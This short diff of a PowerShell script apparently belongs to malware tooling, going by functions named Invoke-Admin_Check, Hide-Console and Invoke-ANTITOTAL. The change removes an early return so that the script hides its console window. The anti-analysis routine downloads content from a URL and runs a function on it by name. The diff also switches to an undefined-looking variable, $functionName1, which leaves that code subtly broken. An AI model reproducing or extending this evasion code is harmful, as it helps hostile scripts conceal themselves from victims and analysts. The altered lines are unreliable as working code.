@@ -15,7 +15,6 @@ function Invoke-Admin_Check {
 
 function Hide-Console
 {
-    return 0
     if (-not ("Console.Window" -as [type])) { 
         Add-Type -Name Window -Namespace Console -MemberDefinition '
         [DllImport("Kernel32.dll")]
@@ -49,7 +48,7 @@ function Invoke-ANTITOTAL {
         $result = Invoke-WebRequest -Uri $url -UseBasicParsing
         if ($result.StatusCode -eq 200) {
             $content = $result.Content
-            $function = Get-Command -Name $functionName
+            $function = Get-Command -Name $functionName1
             $output = & $function.Name $content
             
             if ($output -eq $true) {
